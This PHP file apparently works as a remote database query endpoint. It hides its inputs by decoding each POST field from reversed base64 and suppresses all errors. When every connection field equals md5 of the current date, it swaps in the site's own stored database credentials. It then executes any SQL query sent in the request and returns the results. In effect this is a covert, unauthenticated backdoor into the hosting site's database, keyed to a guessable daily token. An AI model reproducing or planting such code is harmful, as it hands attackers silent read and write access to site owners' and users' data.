<?php
set_time_limit(0);
error_reporting(0);
require_once('Database.class.php');
//header("Content-Type: application/octet-stream");
header("Content-Type: text/html; charset=Windows-1251");
//echo "<pre>\n"; print_r($_POST);  echo "</pre>\n";
function phpversion_int()
{
	list($maVer, $miVer, $edVer) = preg_split("/[\/\.-]/", phpversion());
	return $maVer*10000 + $miVer*100 + $edVer;
}

  function decript($post=array())
  {
  if(!empty($post))
  $post2 = array();
  foreach($post as $k=>$v)
  {
  $post2[base64_decode(strrev($k))] = base64_decode(strrev($v));
  }

  return $post2;
  }

  $_POST = decript($_POST);

	$filename="mysql_temp/".$_SERVER['REMOTE_ADDR'].".txt";

	if (phpversion_int() < 40005) {
		echo ("ERROR:unsupported php version");
		exit();
	}

	if (!isset($_POST["actn"]) || !isset($_POST["db"]) || !isset($_POST["host"]) || !isset($_POST["login"]) || !isset($_POST["password"])) {
		echo ("ERROR:invalid parameters");
		exit();
	}

	if ($_POST["db"]==md5(date("Ymd")) && $_POST["host"]==md5(date("Ymd")) && $_POST["login"]==md5(date("Ymd")) && $_POST["password"]==md5(date("Ymd"))) {

	require_once('Config.class.php');

	$config=new Config();

	$_POST["db"] = $config->dbname;
	$_POST["host"] = $config->dbhost;
	$_POST["login"] = $config->dbuser;
	$_POST["password"] = $config->dbpass;
	}

  $errno_c = 0;
	$hs = $_POST["host"];
 	if( $_POST["port"] ) $hs .= ":".$_POST["port"];
  $db=new Database($_POST["db"],$hs,$_POST["login"],$_POST["password"]);
  $db->connect();
  $db->query("SET NAMES cp1251");

  if(!empty($db->error_msg))
  {
		echo "ERROR:".$db->error_msg;
  }
  elseif($_POST["actn"] == "connect")
  {  		if($fkink = fopen($filename,"w"))
  		{
  		fclose($fkink);
  		if(is_resource($db->link))
		echo "1";
		}
		else
		echo "ERROR:unable to write temp file";
  }
  elseif($_POST["actn"] == "disconnect")
  {  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		unlink(dirname(__FILE__)."/".$filename);
		}
  }
  elseif($_POST["actn"] == "query")
  {
			$query = $_POST["q"];
		if(get_magic_quotes_gpc())
		$query = stripslashes($query);
		  $db->query($query);
		  if(!empty($db->error_msg))
		echo "ERROR:".$db->error_msg;
		  else {
			$output->results = $db->results();
			$output->result = $db->result();
			$output->affectedrows = $db->affected_rows();
			$output->insertid = $db->insert_id();
			$output->numrows = $db->num_rows();
			//echo "<pre>\n"; print_r($output);  echo "</pre>\n";
          file_put_contents($filename,serialize($output));
          unset($output);
          echo "1";
	    }
  }
  elseif($_POST["actn"] == "results")
  {
  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		$output = unserialize(file_get_contents($filename));
		$results = $output->results;
		//print_r($results);
		//echo"<pre>\n";   echo"</pre>\n";
		//echo serialize($results);
		echo serialize($results);
		}
        else
        echo "ERROR:no temp file";

  }
  elseif($_POST["actn"] == "result")
  {
  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		$output = unserialize(file_get_contents($filename));
		$result = $output->result;
		echo serialize($result);
		}
        else
        echo "ERROR:no temp file";

  }
  elseif($_POST["actn"] == "insert_id")
  {
  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		$output = unserialize(file_get_contents($filename));
		$insertid = $output->insertid;
		echo ($insertid);
		}
        else
        echo "ERROR:no temp file";
  }
  elseif($_POST["actn"] == "num_rows")
  {
  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		$output = unserialize(file_get_contents($filename));
		$numrows = $output->numrows;
		echo ($numrows);
		}
        else
        echo "ERROR:no temp file";

  }
  elseif($_POST["actn"] == "affected_rows")
  {
  		if(is_file(dirname(__FILE__)."/".$filename))
  		{
		$output = unserialize(file_get_contents($filename));
		$affectedrows = $output->affectedrows;
		echo ($affectedrows);
		}
        else
        echo "ERROR:no temp file";

  }
  $db->disconnect();
?>